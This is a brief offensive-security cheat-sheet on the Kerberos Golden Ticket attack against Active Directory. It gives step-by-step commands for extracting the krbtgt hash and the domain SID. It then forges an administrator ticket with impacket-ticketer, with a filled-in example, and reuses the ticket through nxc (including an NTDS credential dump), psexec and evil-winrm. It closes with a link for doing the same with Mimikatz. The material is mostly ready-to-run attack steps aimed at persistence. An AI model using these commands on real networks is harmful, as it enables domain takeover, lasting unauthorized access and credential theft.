# Golden ticket

### Externally from your attacker machine
You can create persistence to the domain stealing the krbtgt nt account hash. Once you have it, you can create your own kerberos tickets to get acces to the machine as any user you want.  ⚠️ `You just need one one important requirement -> krbtgt nt hash`⚠️. You can get this hash normally with Netexec or secretsdump, if you have enought privileges. Normally after privilege escalation (thats why is a persistence method). In case you get his hash in a context of non privileged user, of course you can use it to escalate. 

Ingredients:
- krbtgt ht account hash (from ntds. Use nxc or secretsdump to get it)
- Domain SID (you can use lookupsid.py tool to get it)
- Impacket suite in your attacker machine (by default in kali / parrot, or just  install it for any other linux distro)
- User to impersonate (any user you want to get, normally administrator. You just need the name)

Create your ticket:

`ticketer.py -nthash <nthash> -domain-sid <domain sid> -domain <domain> <user to impersonate>`

(in kali use impacket-ticketer command)

Example:

`impacket-ticketer -nthash 0f55cdc43bd8f5814588f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-43765186-2505414164 -domain megacorp.local administrator`

This will generate an administrator.ccache file, that should be exported to KRBCCNAME enviroment variable:

`export KRB5CCNAME=administrator.ccache`

Once done, you can use your prefered tool to get inside the machine again:

`nxc smb <target ip> -u "administrator" -k --use-kcache --ntds`

`impacket-psexec '<domain>/administrator:@<machine.domain>' -k -no-pass`

`evil-winrm -r <domain> -i <machine.domain>` (after previously edited the /etc/krb5.conf, obiously)

<br>

### Internally inside windows machine
In case you have only internal access you can generate ticket and use it using Mimikatz tool -> https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/
